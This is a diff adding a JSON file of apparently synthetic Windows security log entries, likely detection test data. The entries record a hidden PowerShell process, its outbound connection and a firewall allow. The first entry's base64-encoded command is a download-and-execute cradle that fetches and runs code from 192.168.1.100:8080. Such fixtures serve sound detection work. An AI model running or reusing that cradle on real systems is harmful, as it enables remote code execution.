@@ -1,0 +1,26 @@
+[
+    {
+        "timestamp":"2026-05-29T08:15:23Z",
+        "source":"DC01-Prod",
+        "message":"Process Create: RuleName=technique_id=T1059, technique_name=Command and Scripting Interpreter, UtcTime=2026-05-29 08:15:23.123, ProcessGuid={a1b2c3d4-e5f6-47a8-b9c0-d1e2f3a4b5c6}, ProcessId=4528, Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, FileVersion=10.0.19041.1, Description=Windows PowerShell, Product=Microsoft Windows Operating System, Company=Microsoft Corporation, OriginalFileName=PowerShell.EXE, CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgAMAA4ADAAJwApADsA, CurrentDirectory=C:\\Users\\jdoe\\, User=CONTOSO\\jdoe, LogonGuid={a1b2c3d4-e5f6-47a8-b9c0-d1e2f3a4b5c7}, LogonId=0x12345, TerminalSessionId=1, IntegrityLevel=Medium, Hashes=SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855, ParentProcessGuid={a1b2c3d4-e5f6-47a8-b9c0-d1e2f3a4b5c8}, ParentProcessId=3012, ParentImage=C:\\Windows\\Explorer.EXE, ParentCommandLine=C:\\Windows\\Explorer.EXE",
+        "severity":"critical"
+    },
+    {
+        "timestamp":"2026-05-29T08:15:24Z",
+        "source":"DC01-Prod",
+        "message":"Network connection detected: RuleName=technique_id=T1071, technique_name=Application Layer Protocol, UtcTime=2026-05-29 08:15:24.451, ProcessGuid={a1b2c3d4-e5f6-47a8-b9c0-d1e2f3a4b5c6}, ProcessId=4528, Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, User=CONTOSO\\jdoe, Protocol=tcp, Initiated=true, SourceIsIpv6=false, SourceIp=10.10.5.25, SourceHostname=DC01-Prod.contoso.local, SourcePort=51234, SourcePortName=, DestinationIsIpv6=false, DestinationIp=192.168.1.100, DestinationHostname=, DestinationPort=8080, DestinationPortName=http-alt",
+        "severity":"high"
+    },
+    {
+        "timestamp":"2026-05-29T08:14:55Z",
+        "source":"DC01-Prod",
+        "message":"Process Create: RuleName=-, UtcTime=2026-05-29 08:14:55.102, ProcessGuid={a1b2c3d4-e5f6-47a8-b9c0-d1e2f3a4b5c8}, ProcessId=3012, Image=C:\\Windows\\Explorer.EXE, FileVersion=10.0.19041.1, Description=Windows Explorer, Product=Microsoft Windows Operating System, Company=Microsoft Corporation, OriginalFileName=Explorer.EXE, CommandLine=C:\\Windows\\Explorer.EXE, CurrentDirectory=C:\\Windows\\system32\\, User=CONTOSO\\jdoe, LogonGuid={a1b2c3d4-e5f6-47a8-b9c0-d1e2f3a4b5c7}, LogonId=0x12345, TerminalSessionId=1, IntegrityLevel=Medium, Hashes=SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF, ParentProcessGuid={00000000-0000-0000-0000-000000000000}, ParentProcessId=4, ParentImage=-, ParentCommandLine=-",
+        "severity":"low"
+    },
+    {
+        "timestamp":"2026-05-29T08:16:01Z",
+        "source":"FW-Edge01",
+        "message":"Firewall: ALLOW TCP 10.10.5.25:51234 -> 192.168.1.100:8080 | Rule: Allow_Outbound_Web | Action: Permitted",
+        "severity":"medium"
+    }
+]
